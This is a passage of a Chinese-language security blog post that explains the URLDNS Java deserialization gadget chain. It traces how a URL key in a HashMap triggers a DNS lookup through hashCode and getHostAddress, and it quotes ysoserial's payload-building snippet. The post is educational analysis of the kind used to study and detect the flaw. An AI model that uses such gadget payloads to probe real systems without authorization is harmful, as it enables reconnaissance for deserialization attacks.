+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (host <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>                h <span style="color:#f92672">+=</span> host.<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">hashCode</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>有调用<code>getHostAddress()</code>,跟进看</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hostAddress <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hostAddress;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (host <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> host.<span style="color:#a6e22e">isEmpty</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            hostAddress <span style="color:#f92672">=</span> InetAddress.<span style="color:#a6e22e">getByName</span>(host);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (UnknownHostException <span style="color:#f92672">|</span> SecurityException ex) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hostAddress;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><code>hostAddress = InetAddress.getByName(host);</code> 就是根据主机名去获取IP地址，也就会发送一次DNS请求.。
+这差不多就是这条链子的最终目的了。</p>
+<p>比较突兀的是如何通过<code>HashMap</code>里的<code> putVal(hash(key), key, value, false, false);</code></p>
+<p>其中的<code>hash(key)</code>调用<code>key.hashCode()</code>时，如何执行到<code>URL</code>的<code>hashCode</code></p>
+<p>我们看yoserial里面的逻辑</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler();
+</span></span><span style="display:flex;"><span>HashMap ht <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap(); 
+</span></span><span style="display:flex;"><span>URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler); <span style="color:#75715e">// URL to use as the Key// HashMap that will contain the URL</span>
+</span></span><span style="display:flex;"><span>ht.<span style="color:#a6e22e">put</span>(u, url); <span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>
+</span></span></code></pre></div><p>最后是通过<code>ht.put(u, url);</code> 进去看看put函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>很神奇的是<code>put(u, url)</code> 的逻辑</p>
+<p>正是以u为key，以url为value来执行了<code>putVal(hash(key), key, value, false, true);</code></p>
+<p>成功执行了<code>u.hashCode</code>也就是<code>URL.hashCode</code></p>
+<p>参考文章：</p>
+<p><a href="https://blog.huamang.xyz/post/urldns/" target="_blank" rel="noopener noreffer">https://blog.huamang.xyz/post/urldns/</a>
+</p>
+<p>《Java安全漫谈》</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" data-title="java安全 URLDNS链子分析" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" data-title="java安全 URLDNS链子分析"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" data-title="java安全 URLDNS链子分析"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-urldns%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" data-title="java安全 URLDNS链子分析"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="prev" rel="prev" title="java反序列化"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>java反序列化</a>
+            <a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc1%E9%93%BE/" class="next" rel="next" title="java安全 CC1链">java安全 CC1链<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
